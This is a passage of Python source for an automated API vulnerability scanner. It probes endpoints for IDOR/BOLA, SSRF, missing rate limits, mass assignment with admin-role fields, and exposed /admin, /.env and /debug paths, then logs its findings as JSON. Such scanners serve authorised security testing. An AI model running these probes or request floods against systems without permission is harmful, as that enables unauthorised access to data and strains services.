        object_ids = ['1', '2', '100', '999', 'admin', 'test', '0', '-1']
        
        for endpoint_info in endpoints:
            endpoint_url = endpoint_info.get('url', endpoint_info.get('full_url', ''))
            
            # Look for endpoints with ID parameters
            if any(param in endpoint_url.lower() for param in ['user', 'id', 'account', 'profile', 'admin']):
                
                for obj_id in object_ids:
                    try:
                        # Test different ID parameter locations
                        test_urls = [
                            f"{endpoint_url}/{obj_id}",
                            f"{endpoint_url}?id={obj_id}",
                            f"{endpoint_url}?user_id={obj_id}",
                            f"{endpoint_url}?account_id={obj_id}"
                        ]
                        
                        for test_url in test_urls:
                            response = self.session.get(test_url, timeout=10)
                            
                            # Check for unauthorized data access
                            if (response.status_code == 200 and 
                                self._contains_sensitive_data(response.text)):
                                
                                vulnerabilities.append({
                                    'title': 'BOLA/IDOR Vulnerability',
                                    'severity': 'High',
                                    'cvss': 8.0,
                                    'description': f'Possible BOLA/IDOR vulnerability at {test_url}',
                                    'url': test_url,
                                    'parameter': 'object_id',
                                    'payload': obj_id,
                                    'remediation': 'Implement proper authorization checks for object access',
                                    'discovered_by': 'API Agent'
                                })
                                break
                            
                            await asyncio.sleep(self.config['request_delay'])
                        
                    except Exception as e:
                        logger.debug(f"BOLA/IDOR test error: {e}")
                        continue
        
        return vulnerabilities

    async def test_ssrf_vulnerabilities(self, target_url: str, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Test for Server-Side Request Forgery (SSRF) vulnerabilities
        
        Args:
            target_url: Base URL of the target
            endpoints: List of discovered endpoints
            
        Returns:
            List of SSRF vulnerabilities
        """
        vulnerabilities = []
        
        for endpoint_info in endpoints:
            endpoint_url = endpoint_info.get('url', endpoint_info.get('full_url', ''))
            
            # Test SSRF in various parameter formats
            for payload in self.ssrf_payloads:
                try:
                    # Test in JSON body
                    json_data = {
                        'url': payload,
                        'callback': payload,
                        'webhook': payload,
                        'redirect': payload,
                        'image': payload,
                        'fetch': payload
                    }
                    
                    response = self.session.post(endpoint_url, json=json_data, timeout=15)
                    
                    # Check for SSRF indicators
                    if (response.status_code in [200, 201, 202] and
                        (response.elapsed.total_seconds() > 10 or  # Slow response might indicate external request
                         'internal' in response.text.lower() or
                         'localhost' in response.text.lower())):
                        
                        vulnerabilities.append({
                            'title': 'Server-Side Request Forgery (SSRF)',
                            'severity': 'High',
                            'cvss': 8.5,
                            'description': f'Potential SSRF vulnerability at {endpoint_url}',
                            'url': endpoint_url,
                            'parameter': 'url_parameter',
                            'payload': payload,
                            'remediation': 'Implement URL validation and restrict outbound requests',
                            'discovered_by': 'API Agent'
                        })
                        break
                    
                    # Test in URL parameters
                    params = {'url': payload, 'callback': payload}
                    param_response = self.session.get(endpoint_url, params=params, timeout=15)
                    
                    if (param_response.status_code == 200 and
                        param_response.elapsed.total_seconds() > 10):
                        
                        vulnerabilities.append({
                            'title': 'SSRF via URL Parameter',
                            'severity': 'High',
                            'cvss': 8.5,
                            'description': f'SSRF vulnerability in URL parameter at {endpoint_url}',
                            'url': endpoint_url,
                            'parameter': 'url_param',
                            'payload': payload,
                            'remediation': 'Validate and restrict URL parameters',
                            'discovered_by': 'API Agent'
                        })
                        break
                    
                    await asyncio.sleep(self.config['request_delay'])
                    
                except Exception as e:
                    logger.debug(f"SSRF test error: {e}")
                    continue
        
        return vulnerabilities

    async def perform_rate_limit_testing(self, target_url: str, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Perform comprehensive rate limit testing
        
        Args:
            target_url: Base URL of the target
            endpoints: List of discovered endpoints
            
        Returns:
            List of rate limiting vulnerabilities
        """
        vulnerabilities = []
        
        # Test different types of endpoints for rate limiting
        endpoint_types = {
            'authentication': ['login', 'auth', 'signin', 'token'],
            'sensitive': ['admin', 'user', 'account', 'profile'],
            'api': ['api', 'rest', 'graphql']
        }
        
        for endpoint_info in endpoints[:5]:  # Limit testing for safety
            endpoint_url = endpoint_info.get('url', endpoint_info.get('full_url', ''))
            
            # Determine endpoint type
            endpoint_type = 'general'
            for etype, keywords in endpoint_types.items():
                if any(keyword in endpoint_url.lower() for keyword in keywords):
                    endpoint_type = etype
                    break
            
            try:
                # Perform burst test
                burst_results = await self._perform_burst_test(endpoint_url, endpoint_type)
                if burst_results:
                    vulnerabilities.extend(burst_results)
                
                # Perform sustained test for critical endpoints
                if endpoint_type in ['authentication', 'sensitive']:
                    sustained_results = await self._perform_sustained_test(endpoint_url, endpoint_type)
                    if sustained_results:
                        vulnerabilities.extend(sustained_results)
                
            except Exception as e:
                logger.debug(f"Rate limit testing error for {endpoint_url}: {e}")
                continue
        
        return vulnerabilities

    async def _perform_burst_test(self, endpoint_url: str, endpoint_type: str) -> List[Dict[str, Any]]:
        """Perform burst rate limit testing"""
        vulnerabilities = []
        
        try:
            # Send rapid requests
            burst_size = self.rate_limit_config['burst_requests']
            responses = []
            start_time = time.time()
            
            for i in range(burst_size):
                response = self.session.get(endpoint_url, timeout=5)
                responses.append(response.status_code)
                
                # Very small delay to simulate rapid requests
                if i < burst_size - 1:
                    await asyncio.sleep(0.05)
            
            end_time = time.time()
            
            # Analyze results
            success_count = sum(1 for status in responses if status == 200)
            rate_limited_count = sum(1 for status in responses if status == 429)
            
            # Check if rate limiting is missing
            if success_count > (burst_size * 0.8) and rate_limited_count == 0:
                severity = 'High' if endpoint_type in ['authentication', 'sensitive'] else 'Medium'
                cvss = 7.5 if endpoint_type in ['authentication', 'sensitive'] else 5.0
                
                vulnerabilities.append({
                    'title': f'Missing Rate Limiting - {endpoint_type.title()} Endpoint',
                    'severity': severity,
                    'cvss': cvss,
                    'description': f'No rate limiting detected on {endpoint_type} endpoint {endpoint_url}',
                    'url': endpoint_url,
                    'parameter': 'rate_limiting',
                    'payload': f'Burst test: {burst_size} requests in {end_time - start_time:.2f}s',
                    'remediation': f'Implement rate limiting for {endpoint_type} endpoints',
                    'discovered_by': 'API Agent'
                })
        
        except Exception as e:
            logger.debug(f"Burst test error: {e}")
        
        return vulnerabilities

    async def _perform_sustained_test(self, endpoint_url: str, endpoint_type: str) -> List[Dict[str, Any]]:
        """Perform sustained rate limit testing"""
        vulnerabilities = []
        
        try:
            # Send sustained requests over time
            duration = min(self.rate_limit_config['test_duration'], 30)  # Max 30 seconds
            rps = self.rate_limit_config['requests_per_second']
            
            responses = []
            start_time = time.time()
            
            while (time.time() - start_time) < duration:
                response = self.session.get(endpoint_url, timeout=5)
                responses.append(response.status_code)
                
                # Wait to maintain target RPS
                await asyncio.sleep(1.0 / rps)
            
            # Analyze sustained performance
            success_count = sum(1 for status in responses if status == 200)
            total_requests = len(responses)
            
            if success_count > (total_requests * 0.9):
                vulnerabilities.append({
                    'title': f'Insufficient Rate Limiting - {endpoint_type.title()} Endpoint',
                    'severity': 'Medium',
                    'cvss': 6.0,
                    'description': f'Rate limiting may be insufficient for sustained load on {endpoint_url}',
                    'url': endpoint_url,
                    'parameter': 'sustained_rate_limiting',
                    'payload': f'Sustained test: {total_requests} requests over {duration}s',
                    'remediation': 'Review and strengthen rate limiting policies',
                    'discovered_by': 'API Agent'
                })
        
        except Exception as e:
            logger.debug(f"Sustained test error: {e}")
        
        return vulnerabilities

    def log_scan_results_json(self, results: Dict[str, Any]) -> None:
        """
        Log scan results in structured JSON format
        
        Args:
            results: Scan results dictionary
        """
        try:
            # Create detailed log entry
            log_entry = {
                'timestamp': time.time(),
                'iso_timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
                'scan_id': str(uuid.uuid4()),
                'target_url': results.get('target', ''),
                'scan_type': results.get('scan_type', 'api_security'),
                'scanner_version': '2.0.0',
                'total_vulnerabilities': len(results.get('vulnerabilities', [])),
                'vulnerability_summary': self._create_vulnerability_summary(results.get('vulnerabilities', [])),
                'discovered_endpoints': len(results.get('discovered_endpoints', [])),
                'scan_duration': results.get('scan_duration', 0),
                'vulnerabilities': results.get('vulnerabilities', []),
                'endpoints': results.get('discovered_endpoints', []),
                'authentication_tested': True,
                'rate_limiting_tested': True,
                'injection_tested': True,
                'status': 'completed' if not results.get('error') else 'error',
                'error': results.get('error')
            }
            
            # Log to structured file
            import json
            logger.info(f"📊 API Scan Results: {json.dumps(log_entry, indent=2)}")
            
            # Also save to dedicated results file
            results_file = f"logs/api_scan_results_{int(time.time())}.json"
            try:
                import os
                os.makedirs('logs', exist_ok=True)
                with open(results_file, 'w') as f:
                    json.dump(log_entry, f, indent=2)
                logger.info(f"💾 Results saved to: {results_file}")
            except Exception as save_error:
                logger.debug(f"Failed to save results file: {save_error}")
            
        except Exception as e:
            logger.error(f"Failed to log JSON results: {e}")

    def _create_vulnerability_summary(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, int]:
        """Create a summary of vulnerabilities by severity"""
        summary = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
        
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'Unknown')
            if severity in summary:
                summary[severity] += 1
        
        return summary

    async def _test_function_level_auth(self, target_url: str, endpoints: List[Dict]) -> List[Dict[str, Any]]:
        """Test for function level authorization vulnerabilities"""
        vulnerabilities = []
        
        for endpoint in endpoints[:5]:  # Test first 5 endpoints
            try:
                # Test accessing admin functions without proper authorization
                admin_paths = ['/admin', '/administrator', '/management', '/config']
                for admin_path in admin_paths:
                    test_url = f"{target_url}{admin_path}"
                    response = self.session.get(test_url, timeout=10)
                    
                    if response.status_code == 200 and 'admin' in response.text.lower():
                        vulnerabilities.append({
                            'title': 'Function Level Authorization Bypass',
                            'severity': 'High',
                            'cvss': 7.5,
                            'description': f'Admin functions accessible without proper authorization at {admin_path}',
                            'url': test_url,
                            'discovered_by': 'API Agent',
                            'remediation': 'Implement proper function-level authorization checks'
                        })
                        
            except Exception as e:
                logger.debug(f"Function level auth test error: {e}")
                
        return vulnerabilities

    async def _test_mass_assignment(self, target_url: str, endpoints: List[Dict]) -> List[Dict[str, Any]]:
        """Test for mass assignment vulnerabilities"""
        vulnerabilities = []
        
        for endpoint in endpoints[:3]:  # Test first 3 endpoints
            try:
                if endpoint.get('url'):
                    # Test mass assignment with admin fields
                    test_data = {
                        'user': 'testuser',
                        'role': 'admin',
                        'is_admin': True,
                        'permissions': ['admin', 'write', 'delete']
                    }
                    
                    response = self.session.post(endpoint['url'], json=test_data, timeout=10)
                    
                    if response.status_code in [200, 201] and ('admin' in response.text or 'role' in response.text):
                        vulnerabilities.append({
                            'title': 'Mass Assignment Vulnerability',
                            'severity': 'Medium',
                            'cvss': 6.1,
                            'description': 'API endpoint accepts unauthorized parameters that could modify user privileges',
                            'url': endpoint['url'],
                            'discovered_by': 'API Agent',
                            'remediation': 'Implement parameter whitelisting and validate all input parameters'
                        })
                        
            except Exception as e:
                logger.debug(f"Mass assignment test error: {e}")
                
        return vulnerabilities

    async def _test_security_misconfig(self, target_url: str, endpoints: List[Dict]) -> List[Dict[str, Any]]:
        """Test for security misconfigurations"""
        vulnerabilities = []
        
        try:
            # Test for debug endpoints
            debug_endpoints = ['/debug', '/test', '/dev', '/staging', '/.env', '/config']
            
            for debug_path in debug_endpoints:
                test_url = f"{target_url}{debug_path}"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    vulnerabilities.append({
                        'title': 'Security Misconfiguration - Debug Endpoint Exposed',
                        'severity': 'Medium',
                        'cvss': 5.3,
                        'description': f'Debug or development endpoint exposed: {debug_path}',
                        'url': test_url,
                        'discovered_by': 'API Agent',
                        'remediation': 'Remove or properly secure debug endpoints in production'
                    })
                    
            # Test for verbose error messages
            error_test_url = f"{target_url}/nonexistent"
            response = self.session.get(error_test_url, timeout=10)
            
            if response.status_code >= 400 and len(response.text) > 500:
                if any(keyword in response.text.lower() for keyword in ['stack trace', 'error', 'exception', 'debug']):
                    vulnerabilities.append({
                        'title': 'Security Misconfiguration - Verbose Error Messages',
                        'severity': 'Low',
                        'cvss': 3.1,
                        'description': 'API returns verbose error messages that may reveal sensitive information',
                        'url': error_test_url,
                        'discovered_by': 'API Agent',
                        'remediation': 'Implement generic error messages and proper error handling'
                    })
                    
        except Exception as e:
            logger.debug(f"Security misconfiguration test error: {e}")
            
        return vulnerabilities

    async def _test_bola_vulnerabilities(self, target_url: str, endpoints: List[Dict]) -> List[Dict[str, Any]]:
        """Test for BOLA/IDOR vulnerabilities"""
        vulnerabilities = []
        
        for endpoint in endpoints[:3]:  # Test first 3 endpoints
            try:
                if endpoint.get('url') and any(param in endpoint['url'] for param in ['id=', 'user=', 'account=']):
                    # Test IDOR by modifying ID parameters
                    original_url = endpoint['url']
                    
                    # Try different user IDs
                    test_ids = ['1', '2', '999', 'admin', 'test']
                    for test_id in test_ids:
                        # Replace ID parameter
                        if 'id=' in original_url:
                            test_url = re.sub(r'id=\d+', f'id={test_id}', original_url)
                        elif 'user=' in original_url:
                            test_url = re.sub(r'user=\w+', f'user={test_id}', original_url)
                        else:
                            continue
                            
                        response = self.session.get(test_url, timeout=10)
                        
                        if response.status_code == 200 and len(response.text) > 100:
                            vulnerabilities.append({
                                'title': 'BOLA/IDOR Vulnerability',
                                'severity': 'Critical',
                                'cvss': 8.1,
                                'description': f'Broken Object Level Authorization - unauthorized access to user data via ID manipulation',
                                'url': test_url,
                                'discovered_by': 'API Agent',
                                'remediation': 'Implement proper object-level authorization checks'
                            })
                            break
                            
            except Exception as e:
                logger.debug(f"BOLA test error: {e}")
                
        return vulnerabilities
